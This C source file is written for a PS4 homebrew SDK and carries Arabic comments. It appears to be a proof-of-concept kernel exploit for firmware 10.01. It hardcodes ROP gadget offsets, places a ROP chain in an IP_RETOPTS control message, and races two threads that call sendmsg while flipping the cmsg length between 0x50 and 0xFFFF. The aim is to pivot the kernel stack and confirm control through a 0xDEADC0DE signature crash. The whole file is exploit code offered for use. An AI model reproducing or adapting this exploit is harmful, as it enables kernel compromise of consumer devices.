#include <ps4.h>

// الإزاحات لنسخة 10.01 (تأكيد الوصول لـ ROP)
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_POP_RAX_RET          0x09974F
#define OFF_RET                  0x0008E0

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

#define CONTROL_LEN 256
uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;

// هذه الدالة تبني سلسلة "توقيع" (Signature) في السجلات
void build_confirmation_chain(uint64_t kbase) {
    memset(control_buf, 0, CONTROL_LEN);
    
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; // IP_RETOPTS
    cmsg->cmsg_len = 0x50;

    uint64_t entry_gadget = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint64_t pop_rax = kbase + OFF_POP_RAX_RET;

    // ملء البفر لضمان أن الـ Stack Pivot يجد السلسلة
    for (int i = 0x48; i < CONTROL_LEN - 32; i += 8) {
        uint64_t *rop = (uint64_t *)(control_buf + i);
        
        rop[0] = entry_gadget;           // الخطوة 1: دفع RSP إلى RSI
        rop[1] = pop_rax;                // الخطوة 2: سحب قيمة إلى RAX
        rop[2] = 0xDEADC0DE;             // "التوقيع" - إذا رأيت هذه القيمة في RAX، فالثغرة تعمل 100%
        rop[3] = 0;                      // سيؤدي هذا لـ Crash (RIP: 0) لتوليد التقرير
    }
}

void *sendmsg_thread(void *arg) {
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) { syscall(28, global_sock, &msg, 0); }
    return NULL;
}

void *race_thread(void *arg) {
    while(1) {
        cmsg->cmsg_len = 0x50;   
        cmsg->cmsg_len = 0xFFFF; 
    }
    return NULL;
}

int _main(struct thread *td) {
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    build_confirmation_chain(kbase);

    global_sock = syscall(97, 2, 2, 0);
    
    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);
    
    return 0;
}
